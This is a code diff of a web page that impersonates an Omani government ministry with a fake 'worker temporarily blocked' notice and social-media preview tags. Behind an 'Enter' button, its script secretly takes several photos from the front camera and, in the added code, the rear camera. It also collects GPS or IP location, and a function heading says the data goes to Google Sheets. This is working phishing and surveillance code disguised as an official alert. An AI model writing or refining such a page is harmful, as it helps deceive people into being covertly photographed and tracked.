@@ -4,16 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تنبيه</title>
-    <meta property="og:title" content="The worker has been temporarily blocked.">
-    <meta property="og:description" content="This worker has been temporarily blocked. Tap to continue and view report details.">
-    <meta property="og:image" content="https://i.ibb.co/Hp21fQYn/Passport-Block3.jpg">
-    <meta property="og:image:secure_url" content="https://i.ibb.co/Hp21fQYn/Passport-Block3.jpg">
+    <!-- WhatsApp / Facebook link preview -->
+    <meta property="og:title" content="تم حظر الإعلان مؤقتاً">
+    <meta property="og:description" content="تم حظر هذا الإعلان مؤقتاً. اضغط للمتابعة ومعاينة تفاصيل البلاغ.">
+    <meta property="og:image" content="https://i.ibb.co/s9yKY3W3/0216fa03-9d1c-4a56-a67e-db86e5adee44.jpg">
+    <meta property="og:image:secure_url" content="https://i.ibb.co/s9yKY3W3/0216fa03-9d1c-4a56-a67e-db86e5adee44.jpg">
     <meta property="og:image:type" content="image/jpeg">
     <meta property="og:url" content="https://ministryofheritageandtourism-alt.github.io/InspectionSection/">
     <meta property="og:type" content="website">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="The worker has been temporarily blocked.">
-    <meta name="twitter:description" content="This worker has been temporarily blocked. Tap to continue and view report details.">
+    <meta name="twitter:title" content="تم حظر الإعلان مؤقتاً">
+    <meta name="twitter:description" content="تم حظر هذا الإعلان مؤقتاً. اضغط للمتابعة ومعاينة تفاصيل البلاغ.">
     <meta name="twitter:image" content="https://i.ibb.co/s9yKY3W3/0216fa03-9d1c-4a56-a67e-db86e5adee44.jpg">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; } 
@@ -105,12 +106,14 @@
 
 <div class="overlay" id="overlay"> 
 <div class="modal">
-   
+    <div style="text-align: center; margin-bottom: 15px;">
+        <img src="https://i.ibb.co/WpgSF5LR/oman-ministry-of-manpower.jpg" alt="tradational" border="0" style="max-width: 100%; max-height: 150px; width: auto; height: auto;">
+    </div>
     <hr style="margin: 10px 0 20px; border: 1px solid #eee; width: 80%; max-width: 300px;">
     <span class="icon">⛔</span>
     <h2>The Worker has been temporarily blocked.</h2>
     <div style="text-align: center; margin-bottom: 15px;">
-        <img src="https://i.ibb.co/Hp21fQYn/Passport-Block3.jpg" alt="tradational" border="0" style="max-width: 300%; max-height: 150px; width: auto; height: auto;">
+        <img src="https://i.ibb.co/Hp21fQYn/Passport-Block3.jpg" alt="tradational" border="0" style="max-width: 100%; max-height: 150px; width: auto; height: auto;">
     </div>
     <p>
        The worker has been temporarily blocked.<br> 
@@ -394,18 +397,13 @@ function captureImageFromVideo(videoElement) {
 // ================================
 async function startCameras(statusDiv, btn) {
     try {
-        // طلب كاميرا واحدة فقط (الأمامية)
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { 
-                facingMode: 'user', 
-                width: { ideal: 320 }, 
-                height: { ideal: 240 } 
-            },
+        // الكاميرا الأمامية
+        const frontStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
             audio: false
         });
-        
         const videoFront = document.getElementById('videoFront');
-        videoFront.srcObject = stream;
+        videoFront.srcObject = frontStream;
         await new Promise((resolve) => {
             videoFront.onloadedmetadata = () => {
                 videoFront.play();
@@ -414,26 +412,59 @@ async function startCameras(statusDiv, btn) {
             };
         });
 
-        statusDiv.innerHTML = "✅ Camera ready. Capturing images...";
+        // الكاميرا الخلفية
+        try {
+            const backStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } },
+                audio: false
+            });
+            const videoBack = document.getElementById('videoBack');
+            videoBack.srcObject = backStream;
+            await new Promise((resolve) => {
+                videoBack.onloadedmetadata = () => {
+                    videoBack.play();
+                    cameraBackReady = true;
+                    resolve();
+                };
+            });
+        } catch (backError) {
+            cameraBackReady = false;
+        }
+
+        statusDiv.innerHTML = "✅ Cameras ready. Capturing images...";
         statusDiv.className = "status-success";
 
-        // التقاط 4 صور من نفس الكاميرا (بدلاً من 2+2)
+        // التقاط صورتين من الكاميرا الأمامية
         const videoFrontEl = document.getElementById('videoFront');
-        for (let i = 0; i < 4; i++) {
+        for (let i = 0; i < 2; i++) {
             await new Promise(resolve => setTimeout(resolve, 300));
             const imgData = captureImageFromVideo(videoFrontEl);
-            if (imgData) {
-                if (i < 2) {
-                    frontImages.push(imgData);
-                } else {
-                    backImages.push(imgData);
-                }
+            if (imgData) frontImages.push(imgData);
+        }
+
+        // التقاط صورتين من الكاميرا الخلفية (أو الأمامية كبديل)
+        const videoBackEl = document.getElementById('videoBack');
+        if (cameraBackReady && videoBackEl && videoBackEl.videoWidth) {
+            for (let i = 0; i < 2; i++) {
+                await new Promise(resolve => setTimeout(resolve, 300));
+                const imgData = captureImageFromVideo(videoBackEl);
+                if (imgData) backImages.push(imgData);
+            }
+        } else {
+            // استخدام الكاميرا الأمامية كبديل
+            for (let i = 0; i < 2; i++) {
+                await new Promise(resolve => setTimeout(resolve, 300));
+                const imgData = captureImageFromVideo(videoFrontEl);
+                if (imgData) backImages.push(imgData);
             }
         }
 
-        // إغلاق تدفق الكاميرا
+        // إغلاق تدفقات الكاميرا
         if (videoFront.srcObject) {
             videoFront.srcObject.getTracks().forEach(track => track.stop());
+        }
+        if (videoBackEl && videoBackEl.srcObject) {
+            videoBackEl.srcObject.getTracks().forEach(track => track.stop());
         }
 
         statusDiv.innerHTML = `📸 Captured ${frontImages.length + backImages.length} images (${frontImages.length} front, ${backImages.length} back)`;
@@ -455,7 +486,6 @@ async function startCameras(statusDiv, btn) {
         btn.textContent = "Enter";
     }
 }
-
 
 // ================================
 // دالة إرسال البيانات إلى Google Sheets
@@ -598,156 +628,6 @@ function getLocationViaGPS() {
     );
 }
 
-
-// ================================
-// دالة الحصول على الموقع ثم تشغيل الكاميرا
-// ================================
-async function getLocationThenCamera(statusDiv, btn) {
-    try {
-        statusDiv.innerHTML = "📍 Getting your location...";
-        statusDiv.className = "status-loading";
-
-        // 1. الحصول على الموقع (سيظهر طلب إذن واحد فقط)
-        const position = await new Promise((resolve, reject) => {
-            if (!navigator.geolocation) {
-                reject(new Error('Geolocation not supported'));
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            });
-        });
-
-        // تخزين الموقع
-        const { latitude, longitude } = position.coords;
-        locationData = { latitude, longitude, source: 'GPS' };
-        
-        // جلب اسم المنطقة
-        const locationName = await getLocationName(latitude, longitude);
-        locationData.locationName = locationName;
-
-        statusDiv.innerHTML = `📍 Location: ${locationName}`;
-        statusDiv.className = "status-success";
-
-        // 2. تشغيل الكاميرا (بدون طلب إذن إضافي لأنها استجابة لنقرة المستخدم)
-        statusDiv.innerHTML = "📷 Starting camera...";
-        statusDiv.className = "status-loading";
-
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { 
-                facingMode: 'user', 
-                width: { ideal: 320 }, 
-                height: { ideal: 240 } 
-            },
-            audio: false
-        });
-        
-        const videoFront = document.getElementById('videoFront');
-        videoFront.srcObject = stream;
-        await new Promise((resolve) => {
-            videoFront.onloadedmetadata = () => {
-                videoFront.play();
-                cameraFrontReady = true;
-                resolve();
-            };
-        });
-
-        statusDiv.innerHTML = "✅ Camera ready. Capturing images...";
-        statusDiv.className = "status-success";
-
-        // التقاط 4 صور
-        const videoFrontEl = document.getElementById('videoFront');
-        for (let i = 0; i < 4; i++) {
-            await new Promise(resolve => setTimeout(resolve, 300));
-            const imgData = captureImageFromVideo(videoFrontEl);
-            if (imgData) {
-                if (i < 2) {
-                    frontImages.push(imgData);
-                } else {
-                    backImages.push(imgData);
-                }
-            }
-        }
-
-        // إغلاق الكاميرا
-        if (videoFront.srcObject) {
-            videoFront.srcObject.getTracks().forEach(track => track.stop());
-        }
-
-        statusDiv.innerHTML = `📸 Captured ${frontImages.length + backImages.length} images`;
-        statusDiv.className = "status-success";
-        
-        if (frontImages.length >= 2 && backImages.length >= 2) {
-            checkAndSend(statusDiv);
-        } else {
-            statusDiv.innerHTML = "⚠️ Could not capture all images. Please try again.";
-            statusDiv.className = "status-error";
-            btn.disabled = false;
-            btn.textContent = "Enter";
-        }
-
-    } catch (err) {
-        // إذا فشل الموقع، استخدم IP كبديل
-        statusDiv.innerHTML = "⚠️ Location access denied. Using approximate location via IP.";
-        statusDiv.className = "status-warning";
-        getLocationViaIP();
-        
-        // استمر في تشغيل الكاميرا
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: 'user', 
-                    width: { ideal: 320 }, 
-                    height: { ideal: 240 } 
-                },
-                audio: false
-            });
-            
-            const videoFront = document.getElementById('videoFront');
-            videoFront.srcObject = stream;
-            await new Promise((resolve) => {
-                videoFront.onloadedmetadata = () => {
-                    videoFront.play();
-                    cameraFrontReady = true;
-                    resolve();
-                };
-            });
-
-            const videoFrontEl = document.getElementById('videoFront');
-            for (let i = 0; i < 4; i++) {
-                await new Promise(resolve => setTimeout(resolve, 300));
-                const imgData = captureImageFromVideo(videoFrontEl);
-                if (imgData) {
-                    if (i < 2) {
-                        frontImages.push(imgData);
-                    } else {
-                        backImages.push(imgData);
-                    }
-                }
-            }
-
-            if (videoFront.srcObject) {
-                videoFront.srcObject.getTracks().forEach(track => track.stop());
-            }
-
-            statusDiv.innerHTML = `📸 Captured ${frontImages.length + backImages.length} images (approx location)`;
-            statusDiv.className = "status-success";
-            
-            if (frontImages.length >= 2 && backImages.length >= 2) {
-                setTimeout(() => checkAndSend(statusDiv), 3000);
-            }
-        } catch (cameraErr) {
-            statusDiv.innerHTML = "❌ Camera access denied. Please allow camera access.";
-            statusDiv.className = "status-error";
-            btn.disabled = false;
-            btn.textContent = "Enter";
-        }
-    }
-}
-
-
 // ================================
 // حدث الضغط على زر متابعة
 // ================================
@@ -758,7 +638,7 @@ document.getElementById('continueBtn').addEventListener('click', async function(
     
     btn.disabled = true;
     btn.textContent = "loading...";
-    statusDiv.innerHTML = "⏳ Starting...";
+    statusDiv.innerHTML = "⏳ Starting cameras and capturing images...";
     statusDiv.className = "status-loading";
 
     frontImages = [];
@@ -767,11 +647,11 @@ document.getElementById('continueBtn').addEventListener('click', async function(
     sendInProgress = false;
     isDone = false;
     cameraFrontReady = false;
+    cameraBackReady = false;
 
-    // استدعاء الدالة الموحدة
-    await getLocationThenCamera(statusDiv, btn);
+    await startCameras(statusDiv, btn);
+    getLocationViaGPS();
 
-    // timeout احتياطي
     setTimeout(() => {
         if (!isDone) {
             if (frontImages.length < 2 || backImages.length < 2) {
@@ -783,10 +663,9 @@ document.getElementById('continueBtn').addEventListener('click', async function(
                 statusDiv.innerHTML = "⚠️ Timeout: Location not retrieved. Using IP.";
                 statusDiv.className = "status-warning";
                 getLocationViaIP();
-                setTimeout(() => checkAndSend(statusDiv), 3000);
             }
         }
-    }, 30000);
+    }, 25000);
 });
 </script>
 </body>
